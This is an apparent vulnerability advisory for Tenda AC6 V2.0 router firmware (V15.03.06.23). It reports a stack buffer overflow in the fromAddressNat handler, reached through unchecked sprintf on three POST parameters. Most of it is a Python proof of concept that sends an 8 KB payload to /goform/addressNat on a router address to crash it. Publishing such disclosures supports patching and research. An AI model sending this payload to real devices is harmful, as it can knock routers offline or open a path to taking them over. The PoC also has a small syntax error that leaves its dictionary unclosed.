# Tenda AC6V2.0_V15.03.06.23_multi firmware is vulnerable to Buffer Overflow via function "fromAddressNat"

Firmware download website:

[AC6V2.0升级软件_腾达(Tenda)官方网站](https://www.tenda.com.cn/material/show/102855)

Within the `fromAddressNat` function, a user can craft a POST request to supply three parameters: **`entrys`**, **`mitInterface`**, and **`page`**. These parameters are then directly passed to stack-allocated variables using `sprintf` **without any prior validation or checks**. Any one of these three parameters can independently lead to a **stack overflow**.

![image-20250618173006573](https://kingimg.oss-cn-hangzhou.aliyuncs.com/img/image-20250618173006573.png)

poc

```python
import requests
def send_payload(url, payload):
    params={
            'entrys':payload,#vuln
            'mitInterface':b'1',#vuln
            'page':b'1'#vuln}
    cookie={'password':'yectgb'}
    response = requests.post(url,cookies=cookie,data=params)
    print(f"Status Code: {response.status_code}")
    print(f"Response Text: {response.text}")

payload=b'a'*0x2000+b'\n'
url="http://192.168.1.1/goform/addressNat"
send_payload(url, payload)   
```

![image-20250618173624226](https://kingimg.oss-cn-hangzhou.aliyuncs.com/img/image-20250618173624226.png)